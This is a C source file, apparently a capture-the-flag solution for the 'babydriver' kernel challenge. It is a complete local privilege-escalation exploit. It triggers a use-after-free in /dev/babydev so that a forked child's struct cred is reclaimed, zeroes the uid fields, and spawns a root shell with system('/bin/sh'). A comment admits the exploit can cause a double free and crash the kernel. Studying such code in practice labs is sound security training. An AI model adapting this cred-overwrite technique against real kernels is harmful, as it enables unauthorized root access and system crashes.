/* https://github.com/pr0cf5/kernel-exploit-practice/tree/master/babydriver */
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


#define DEV "/dev/babydev"


int main()
{
    int fd0, fd1, i;
    char buf[256];
    fd0 = open(DEV, O_RDWR);
    fd1 = open(DEV, O_RDWR);
    perror("open");

    /* ~ sizeof(struct cred) */
    ioctl(fd0, 0x10001, 0xa8);

    /* UAF via fd1 */
    close(fd0);

    if (fork()) {
        wait(NULL);
    } else {
        /* child */
        read(fd1, buf, 0xa8 - 1);
        for (i = 0; i < 0xa8; i += 8)
            printf("%llx\n", *(long long *)(buf + i) );

        memset(buf, 0, 5*8);
        write(fd1, buf, 5*8);
//         perror("write");

//         read(fd1, buf, 0xa8 - 1);
//         for (i = 0; i < 0xa8; i += 8)
//             printf("%llx\n", *(long long *)(buf + i) );

        system("/bin/sh");
    }
    /* this closing, either explicit or automatic (on exploit termination)
     * seems to lead to double free and then a kernel crash eventually...
     * so another solution is more preferrable, though this one is quite
     * enough to get the flag */
    close(fd1);

    return 0;
}
